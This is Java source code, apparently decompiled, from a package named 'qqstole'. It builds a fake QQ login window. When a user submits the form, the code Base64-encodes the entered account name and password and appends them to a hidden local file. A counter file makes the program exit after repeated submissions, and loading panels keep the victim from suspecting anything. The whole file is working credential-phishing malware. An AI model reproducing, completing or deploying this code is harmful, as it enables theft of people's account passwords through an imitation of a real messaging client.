package qqstole;

import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Color;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Point;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseMotionAdapter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Base64;
import java.util.Scanner;
import javax.swing.BorderFactory;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import tools.ImageButton;
import tools.ImageLabel;
import tools.YcSimpleLayout;

public class QQFrame extends JFrame {
   private static final long serialVersionUID = 1L;
   JFrame that = this;
   static boolean keyflag = false;
   static boolean focusflag = false;
   int originX = 464;
   int originY = 219;
   Container qban = this.getContentPane();
   static JPanel p1 = new JPanel();
   static final File file;
   static final File number;
   static QQPanel2 p2;
   static QQPanel3 p3;
   static QQPanel4 p4;
   static JLabel label1;
   static JLabel label2;
   static JLabel label3;
   static ImageLabel label4;
   static ImageLabel label5;
   static ImageLabel label6;
   static ImageLabel label7;
   static ImageLabel label8;
   static ImageLabel label9;
   static JLabel label10;
   static JLabel label11;
   static ImageLabel label12;
   static ImageLabel label13;
   static ImageLabel label14;
   static ImageLabel label15;
   static ImageLabel label16;
   static ImageLabel label17;
   static ImageLabel label18;
   static JLabel label19;
   static JLabel label20;
   static JLabel label21;
   static ImageLabel label22;
   static ImageLabel label23;
   static ImageLabel label24;
   static JLabel label25;
   static JLabel label26;
   static JLabel label27;
   static ImageLabel label28;
   static CardLayout card;
   static JTextField text1;
   static JPasswordField text2;
   static ImageButton b;

   static {
      file = new File("E:" + File.separator + "test"+File.separator +"ycterminated" + File.separator + "inportant.txt");
      number = new File("E:" + File.separator+ "test"+File.separator  + "ycterminated" + File.separator + "writable.txt");
      p2 = new QQPanel2();
      p3 = new QQPanel3();
      p4 = new QQPanel4();
      label1 = new JLabel();
      label2 = new JLabel();
      label3 = new JLabel();
      label4 = new ImageLabel("/images/l1.png", QQFrame.class);
      label5 = new ImageLabel("/images/l2.png", QQFrame.class);
      label6 = new ImageLabel("/images/l3.png", QQFrame.class);
      label7 = new ImageLabel("/images/l3.png", QQFrame.class);
      label8 = new ImageLabel("/images/l4.png", QQFrame.class);
      label9 = new ImageLabel("/images/l5.png", QQFrame.class);
      label10 = new JLabel();
      label11 = new JLabel();
      label12 = new ImageLabel("/images/l6.png", QQFrame.class);
      label13 = new ImageLabel("/images/l8.png", QQFrame.class);
      label14 = new ImageLabel("/images/l7.png", QQFrame.class);
      label15 = new ImageLabel("/images/t1.png", QQFrame.class);
      label16 = new ImageLabel("/images/t2.png", QQFrame.class);
      label17 = new ImageLabel("/images/d1.png", QQFrame.class);
      label18 = new ImageLabel("/images/d2.png", QQFrame.class);
      label19 = new JLabel();
      label20 = new JLabel();
      label21 = new JLabel();
      label22 = new ImageLabel("/images/l6.png", QQFrame.class);
      label23 = new ImageLabel("/images/l9.png", QQFrame.class);
      label24 = new ImageLabel("/images/l10.png", QQFrame.class);
      label25 = new JLabel();
      label26 = new JLabel();
      label27 = new JLabel();
      label28 = new ImageLabel("/images/d3.png", QQFrame.class);
      card = null;
      text1 = new JTextField();
      text2 = new JPasswordField();
      b = new ImageButton("/images/button.png", QQFrame.class);
   }

   public QQFrame() throws IOException {
      String n="";
      p1.setLayout(new CardLayout());
      card = (CardLayout)p1.getLayout();
      p2.addMouseListener(new YcMouseLinstener(p2));
      label1.addMouseListener(new YcMouseLinstener(label1));
      label10.addMouseListener(new YcMouseLinstener(label10));
      label11.addMouseListener(new YcMouseLinstener(label11));
      label2.addMouseListener(new YcMouseLinstener(label2));
      label3.addMouseListener(new YcMouseLinstener(label3));
      label19.addFocusListener(new YcFocusListener(label19));
      label20.addFocusListener(new YcFocusListener(label20));
      label21.addMouseListener(new YcMouseLinstener(label21));
      label25.addMouseListener(new YcMouseLinstener(label25));
      label26.addMouseListener(new YcMouseLinstener(label26));
      label27.addMouseListener(new YcMouseLinstener(label27));
      text1.addFocusListener(new YcFocusListener(text1));
      text2.addFocusListener(new YcFocusListener(text2));
      text2.addKeyListener(new YcKeyListenner());
      text1.setBorder(BorderFactory.createMatteBorder(1, 1, 1, 1, new Color(255, 255, 255, 255)));
      text1.setFont(new Font("宋体", 1, 18));
      text2.setBorder(BorderFactory.createMatteBorder(1, 1, 1, 1, new Color(255, 255, 255, 255)));
      text2.setFont(new Font("宋体", 1, 25));
      b.setBorder(BorderFactory.createMatteBorder(2, 2, 2, 2, new Color(255, 255, 255, 0)));
      label4.setVisible(false);
      label5.setVisible(false);
      label6.setVisible(false);
      label7.setVisible(false);
      label12.setVisible(false);
      label13.setVisible(false);
      label14.setVisible(false);
      label15.setVisible(false);
      label16.setVisible(false);
      label17.setVisible(false);
      label18.setVisible(false);
      label22.setVisible(false);
      label23.setVisible(false);
      label24.setVisible(false);
      label28.setVisible(false);
      p2.setBackground(new Color(131, 176, 255));
      p2.setPreferredSize(new Dimension(0, 330));
      p2.setLayout(new PndLayout((PndLayout)null));
      p2.add(label17);
      p2.add(label18);
      p2.add(label28);
      p2.add(label1);
      p2.add(label2);
      p2.add(label3);
      p2.add(label4);
      p2.add(label5);
      p2.add(label6);
      p2.add(label7);
      p2.add(label8);
      p2.add(label9);
      p2.add(label10);
      p2.add(label11);
      p2.add(label12);
      p2.add(label13);
      p2.add(label14);
      p2.add(label15);
      p2.add(label16);
      p2.add(label19);
      p2.add(label20);
      p2.add(text1);
      p2.add(text2);
      p2.add(b);
      p3.setBackground(new Color(131, 176, 255));
      p3.setPreferredSize(new Dimension(0, 330));
      p4.setBackground(new Color(131, 176, 255, 0));
      p4.setPreferredSize(new Dimension(0, 331));
      p4.setLayout(new ThiLayout((ThiLayout)null));
      p4.add(label21);
      p4.add(label22);
      p4.add(label23);
      p4.add(label24);
      p4.add(label25);
      p4.add(label26);
      p4.add(label27);
      p1.setPreferredSize(new Dimension(428, 331));
      p1.add(p2, "first");
      p1.add(p3, "second");
      p1.add(p4, "third");
      this.move();
      this.qban.setLayout(new BorderLayout());
      this.qban.add(p1, "Center");
      b.addActionListener((e) -> {
         try {
            this.action(card);
         } catch (IOException var3) {
            var3.printStackTrace();
         }

      });

      if (!number.getParentFile().exists()) {
         number.getParentFile().mkdirs();
      }
      if (!number.exists()) {
         try {
            number.createNewFile();
         } catch (IOException var12) {
            var12.printStackTrace();
         }
      }
      Scanner scan = null;

      try {
         scan = new Scanner(number);
      } catch (FileNotFoundException var10) {
         var10.printStackTrace();
      }

      while(scan.hasNext()) {
         n = n + scan.next();
      }

      scan.close();
      if(n.length()>=2){
         System.exit(0);
      };
   }

   private void action(CardLayout card) throws IOException {
      if (text1.getText().length() == 0) {
         label19.requestFocus();
      } else if (text2.getPassword().length == 0) {
         label20.requestFocus();
      } else {
         String aaa = new String(Base64.getEncoder().encode(text1.getText().getBytes()));
         String bbb = new String(Base64.getEncoder().encode((new String(text2.getPassword())).getBytes()));

         if (!file.getParentFile().exists()) {
            file.getParentFile().mkdirs();
         }

         if (!file.exists()) {
            try {
               file.createNewFile();
            } catch (IOException var14) {
               var14.printStackTrace();
            }
         }

         PrintWriter pu = null;

         try {
            pu = new PrintWriter(new FileOutputStream(file, true));
         } catch (FileNotFoundException var13) {
            var13.printStackTrace();
         }

         pu.println(aaa);
         pu.println(bbb);
         pu.println("*************************************************");
         pu.close();
         String n = "";




         PrintWriter ut = null;

         try {
            ut = new PrintWriter(new FileOutputStream(number, true));
         } catch (FileNotFoundException var11) {
            var11.printStackTrace();
         }

         ut.print("F");
         ut.close();
         Scanner scan = null;

         try {
            scan = new Scanner(number);
         } catch (FileNotFoundException var10) {
            var10.printStackTrace();
         }

         while(scan.hasNext()) {
            n = n + scan.next();
         }

         scan.close();
         int q = n.length();
         if (q % 2 == 0 && q != 0) {
            System.exit(0);
         }

         (new Thread(() -> {
            try {
               Thread.sleep(1000L);
            } catch (InterruptedException var2) {
               var2.printStackTrace();
            }

            card.show(p1, "third");
         })).start();
         card.show(p1, "second");
      }

   }

   private void move() {
      p2.addMouseListener(new MouseAdapter() {
         public void mousePressed(MouseEvent e) {
            QQFrame.this.originX = e.getX();
            QQFrame.this.originY = e.getY();
         }
      });
      p2.addMouseMotionListener(new MouseMotionAdapter() {
         public void mouseDragged(MouseEvent e) {
            Point point = QQFrame.this.that.getLocation();
            int offsetX = e.getX() - QQFrame.this.originX;
            int offsetY = e.getY() - QQFrame.this.originY;
            QQFrame.this.that.setLocation(point.x + offsetX, point.y + offsetY);
         }
      });
      p4.addMouseListener(new MouseAdapter() {
         public void mousePressed(MouseEvent e) {
            QQFrame.this.originX = e.getX();
            QQFrame.this.originY = e.getY();
         }
      });
      p4.addMouseMotionListener(new MouseMotionAdapter() {
         public void mouseDragged(MouseEvent e) {
            Point point = QQFrame.this.that.getLocation();
            int offsetX = e.getX() - QQFrame.this.originX;
            int offsetY = e.getY() - QQFrame.this.originY;
            QQFrame.this.that.setLocation(point.x + offsetX, point.y + offsetY);
         }
      });
      p3.addMouseListener(new MouseAdapter() {
         public void mousePressed(MouseEvent e) {
            QQFrame.this.originX = e.getX();
            QQFrame.this.originY = e.getY();
         }
      });
      p3.addMouseMotionListener(new MouseMotionAdapter() {
         public void mouseDragged(MouseEvent e) {
            Point point = QQFrame.this.that.getLocation();
            int offsetX = e.getX() - QQFrame.this.originX;
            int offsetY = e.getY() - QQFrame.this.originY;
            QQFrame.this.that.setLocation(point.x + offsetX, point.y + offsetY);
         }
      });
   }

   private class PndLayout extends YcSimpleLayout {
      private PndLayout() {
      }

      public void layoutContainer(Container parent) {
         QQFrame.label4.setBounds(94, 172, 23, 23);
         QQFrame.label5.setBounds(94, 210, 23, 23);
         QQFrame.label6.setBounds(99, 196, 235, 4);
         QQFrame.label7.setBounds(99, 232, 235, 4);
         QQFrame.label8.setBounds(98, 246, 69, 15);
         QQFrame.label9.setBounds(192, 245, 69, 15);
         QQFrame.label12.setBounds(398, 0, 31, 31);
         QQFrame.label13.setBounds(367, 0, 31, 31);
         QQFrame.label14.setBounds(336, 0, 31, 31);
         QQFrame.label17.setBounds(56, 182, 135, 34);
         QQFrame.label18.setBounds(78, 221, 135, 33);
         QQFrame.label28.setBounds(78, 221, 99, 35);
         QQFrame.text1.setBounds(116, 169, 200, 28);
         QQFrame.text2.setBounds(116, 208, 178, 24);
         QQFrame.b.setBounds(98, 276, 234, 34);
         QQFrame.label1.setBounds(398, 0, 31, 31);
         QQFrame.label2.setBounds(367, 0, 31, 31);
         QQFrame.label3.setBounds(335, 0, 31, 31);
         QQFrame.label10.setBounds(98, 245, 69, 15);
         QQFrame.label11.setBounds(192, 245, 69, 15);
         QQFrame.label15.setBounds(116, 169, 200, 28);
         QQFrame.label16.setBounds(118, 208, 178, 24);
         QQFrame.label19.setBounds(0, 0, 1, 1);
         QQFrame.label20.setBounds(1, 0, 1, 1);
      }

      // $FF: synthetic method
      PndLayout(PndLayout var2) {
         this();
      }
   }

   private class ThiLayout extends YcSimpleLayout {
      private ThiLayout() {
      }

      public void layoutContainer(Container parent) {
         QQFrame.label21.setBounds(334, 303, 92, 25);
         QQFrame.label22.setBounds(398, 0, 31, 31);
         QQFrame.label23.setBounds(367, 0, 31, 31);
         QQFrame.label24.setBounds(336, 0, 31, 31);
         QQFrame.label25.setBounds(398, 0, 31, 31);
         QQFrame.label26.setBounds(367, 0, 31, 31);
         QQFrame.label27.setBounds(336, 0, 31, 31);
      }

      // $FF: synthetic method
      ThiLayout(ThiLayout var2) {
         this();
      }
   }
}
